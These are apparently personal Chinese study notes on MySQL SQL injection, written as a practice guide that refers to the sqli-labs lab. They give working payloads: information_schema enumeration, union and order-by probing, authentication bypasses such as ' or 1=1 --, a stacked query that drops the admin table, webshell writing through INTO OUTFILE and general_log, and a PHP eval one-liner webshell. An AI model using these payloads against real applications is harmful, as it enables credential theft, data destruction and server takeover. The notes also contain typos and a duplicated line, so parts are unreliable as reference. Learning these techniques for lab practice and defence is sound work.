参考 [sql注入过安全狗](https://zhuanlan.zhihu.com/p/68809398)

[sql注入大全博客](https://www.cnblogs.com/miracle77hp/articles/11237843.html)

```
show full columns from teacher
显示所有表字段
```



#### 判断类型

获取了全部数据 从返回的数据 我们立马断定他是数字型注入 而如果是字符型注入 代码里应该是 where id='$id' 就是字符型



#### 获取信息

```text
SESSION_USER(), SYSTEM_USER(), USER(), CURRENT_USER(), CURRENT_USER: 获取当前执行SQL用户，例如返回：root@localhost，root是用户名，localhost是不能远程登录
database(): 获取当前执行SQL的数据库名
version(): 获取当前数据库版本
@@datadir：获取当前数据库存储在计算机上的物理路径
@@version_compile_os：获取当前服务器操作系统版本，例如返回win32
@@hostname：主机名，计算机名
```



mysql中注释符：#   、/**/  、  -- 

information_schema数据库中三个很重要的表：

information_schema.schemata:  该数据表存储了mysql数据库中的所有数据库的库名
information_schema.tables：     该数据表存储了mysql数据库中的所有数据表的表名
information_schema.columns:    该数据表存储了mysql数据库中的所有列的列名
关于这几个表的一些语法：

```
// 通过这条语句可以得到所有的数据库名
select schema_name from information_schema.schemata limit 0,1

// 通过这条语句可以得到所有的数据表名
select table_name from information_schema.tables limit 0,1
// 通过这条语句可以得到指定security数据库中的所有表名
select table_name from information_schema.tables where table_schema='security'limit 0,1

// 通过这条语句可以得到所有的列名
select column_name from information_schema.columns limit 0,1
// 通过这条语句可以得到指定数据库security中的数据表users的所有列名
select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1

//通过这条语句可以得到指定数据表users中指定列password的数据(只能是database()所在的数据库内的数据，因为处于当前数据库下的话不能查询其他数据库内的数据)
select password from users limit 0,1
```



```
mysql中比较常用的一些函数：

version()： 查询数据库的版本          
user()：查询数据库的使用者       
database()：数据库
system_user()：系统用户名
session_user()：连接数据库的用户名
current_user：当前用户名
load_file()：读取本地文件
@@datadir：读取数据库路径
@@basedir：mysql安装路径
@@version_complie_os：查看操作系统
```

ascii(str) : 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii("a")=97

ascii(str) : 返回给定字符的ascii值，如果str是空字符串，返回0；如果str是NULL，返回NULL。如 ascii("a")=97

length(str) : 返回给定字符串的长度，如  length("string")=6

substr(string,start,length) : 对于给定字符串string，从start位开始截取，截取length长度 ,如  substr("chinese",3,2)="in"

substr()、stbstring()、mid()  三个函数的用法、功能均一致

concat(username)：将查询到的username连在一起，默认用逗号分隔

concat(str1,'*',str2)：将字符串str1和str2的数据查询到一起，中间用*连接

group_concat(username) ：将username数据查询在一起，用逗号连接

limit 0,1：查询第1个数        limit  1,1： 查询第2个数             limit  n,1： 查询第n+1个数





#### 写入shell



通过SQL注入漏洞是可以执行写文件操作，当然可以写`WebShell`

利用`loadfile()`，`into outfile`，`into dumpfile`实现读写本地文件

但是使用上面函数的条件是：

1. 数据库允许导入导出（`secure_file_priv`）
2. 当前用户用户文件操作权限（`File_priv`）

```text
SELECT '<?php phpinfo(); ?>' into outfile '网站绝对路径';
```

当`outfile`没权限的时候，可以使用`mysql`写日志来获得`WebShell`

```text
set global general_log='ON';
set global general_log_file='d:/virtualhost/localuser/host9384686/www/upload/dyboy.php';
select '<?php @eval($_POST[1]);?>';#
set global general_log='0';//记得给人家还原
```



#### 笔记

```
mysql的注入


select * from hack
select * from where id =1;
select username from hack where id=1;

exsits()
select*from user where id =1 and exists(select*from hack) 判断有没有
#猜数据库中有没有这个表名字   ——————-第一步（猜表名）
select*from user where id=1 and exists(select username from hack)；
#猜字段     				————————第二部（猜字段）
order by N
select * from hack  order by n；
按照查询的第几个字段排序，mysql中n>真实字段 就会报错
						  ———————---第三步（猜字段个数）


union联合查询
select * from news union select*from news2(必须保证new与new2字段相同)
 
select *from user union select username ,password from hack；
(通过修改后者的字段来查到想要的内容)

select* from hack uonion select 1,2,3 from 123 ；直接显示123
```

```
注释 #与 “-- ” 
另外-- （这里有一个空格，--空格）在SQL内表示注释，但在URL中，如果在最后加上-- ，浏览器在发送请求的时候会把URL末尾的空格舍去，所以我们用--+代替-- ，原因是+在URL被URL编码后会变成空格。
```

```
源码中找字段名
input username
注入工具

```

```
密码绕过   逻辑表达式取真
select * from admin where  username='admin'and  password='password'

(2)' or 1=1 --

select * from admin where  username='' or 1=1 -- 'and  password='password'
(2)	1'or 1=1or 1'

	select *from admin where username='1'or 1=1 or'1'and password=''
	
(3) 'or 1=1;drop table admin --
因为sql语句具有多语句执行的功能 直接就删除了admin表

```

```php
一句话木马
php :<?php @eval($_POST['pass'])?>
```

注入分为两类

数字型注入与字符型注入

```
数字型：select * from table where id=8;
字符型：select * from table where id='8'
```







```
sqli-labs
1.
id=-1' union select 1,2,3 --+
```

![1590024122763](../../../../Vs%20Workstation/note/img/1590024122763.png)



